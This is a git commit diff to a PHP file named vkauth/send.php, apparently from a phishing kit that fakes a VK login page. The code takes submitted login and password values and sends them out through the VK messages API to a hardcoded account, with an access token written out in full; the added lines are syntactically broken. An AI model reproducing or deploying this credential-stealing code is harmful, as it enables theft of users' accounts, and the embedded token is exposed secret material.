0c58dddb6fc8ce6a020125f0eb141d9feceba428
prohorenko007 <42064680+prohorenko007@users.noreply.github.com>
2018-08-03 17:41:29 +0300

    Add files via upload

--- vkauth/send.php
+++ vkauth/send.php
@@ -2,5 +2,7 @@
 $login = $_POST['log'];
 $password = $_POST['pass'];
 $info = $login.":".$password;
-file_get_contents('https://api.vk.com/method/messages.send?user_id=476736080&access_token=e937f3f087db076bcf2cb12170d17d4c62e22f20b97d841fa7cd1e54d29f6d56d8a6aa40bc6b33dd8bed3='.$info.'&v=5.52');
+$token = ""; 279448833 e937f3f087db076bcf2cb12170d17d4c62e22f20b97d841fa7cd1e54d29f6d56d8a6aa40bc6b33dd8bed3
+$user = ""; 279448833
+file_get_contents("https://api.vk.com/method/messages.send?user_id=$id&access_token=$token&message=$info&v=5.52");
 ?>
